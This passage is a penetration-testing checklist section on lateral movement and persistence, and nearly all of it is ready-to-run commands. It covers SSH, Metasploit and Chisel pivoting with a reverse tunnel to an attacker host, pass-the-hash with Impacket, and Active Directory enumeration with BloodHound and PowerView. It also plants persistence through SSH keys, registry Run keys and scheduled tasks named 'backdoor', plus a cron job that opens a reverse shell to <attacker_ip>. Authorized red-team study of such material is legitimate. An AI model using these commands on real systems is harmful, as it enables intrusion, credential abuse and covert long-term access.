## 🔄 Phase 6: Advanced Lateral Movement & Persistence

### Network Pivoting

#### SSH Tunneling
- [ ] **Local Port Forwarding**:
  ```bash
  ssh -L <local_port>:<target_host>:<target_port> user@<pivot_host>
  ```
- [ ] **Dynamic Port Forwarding (SOCKS)**:
  ```bash
  ssh -D 8080 user@<pivot_host>
  # Configure proxychains: socks4 127.0.0.1 8080
  ```
- [ ] **Remote Port Forwarding**:
  ```bash
  ssh -R <remote_port>:<local_host>:<local_port> user@<pivot_host>
  ```

#### Metasploit Pivoting
- [ ] **Meterpreter Autoroute**:
  ```bash
  run autoroute -s <subnet>
  run autoroute -p  # Print routes
  ```
- [ ] **Port Forwarding**:
  ```bash
  portfwd add -l <local_port> -p <remote_port> -r <remote_host>
  ```

#### Chisel Tunneling
- [ ] **Chisel Server** (on attacker machine):
  ```bash
  ./chisel server -p 8080 --reverse
  ```
- [ ] **Chisel Client** (on compromised machine):
  ```bash
  ./chisel client <attacker_ip>:8080 R:socks
  ```

### Windows Lateral Movement

#### Pass-the-Hash Attacks
- [ ] **Using Impacket**:
  ```bash
  python3 psexec.py -hashes <lm_hash>:<nt_hash> administrator@<target>
  python3 wmiexec.py -hashes <lm_hash>:<nt_hash> administrator@<target>
  ```

#### Active Directory Enumeration
- [ ] **BloodHound Data Collection**:
  ```powershell
  Import-Module SharpHound.ps1
  Invoke-BloodHound -CollectionMethod All
  ```
- [ ] **PowerView Enumeration**:
  ```powershell
  Import-Module PowerView.ps1
  Get-NetDomain
  Get-NetUser
  Get-NetGroup
  Get-NetComputer
  ```

#### WinRM Exploitation
- [ ] **Evil-WinRM**:
  ```bash
  evil-winrm -i <target> -u <username> -p <password>
  evil-winrm -i <target> -u <username> -H <hash>
  ```

### Persistence Mechanisms

#### Linux Persistence
- [ ] **SSH Keys**:
  ```bash
  mkdir -p ~/.ssh
  echo "<public_key>" >> ~/.ssh/authorized_keys
  chmod 600 ~/.ssh/authorized_keys
  ```
- [ ] **Cron Jobs**:
  ```bash
  (crontab -l ; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'") | crontab -
  ```
- [ ] **Service Creation**:
  ```bash
  # Create systemd service for persistence
  ```

#### Windows Persistence
- [ ] **Registry Run Keys**:
  ```cmd
  reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v backdoor /t REG_SZ /d "C:\path\to\backdoor.exe"
  ```
- [ ] **Scheduled Tasks**:
  ```cmd
  schtasks /create /tn "backdoor" /tr "C:\path\to\backdoor.exe" /sc minute /mo 1
  ```

---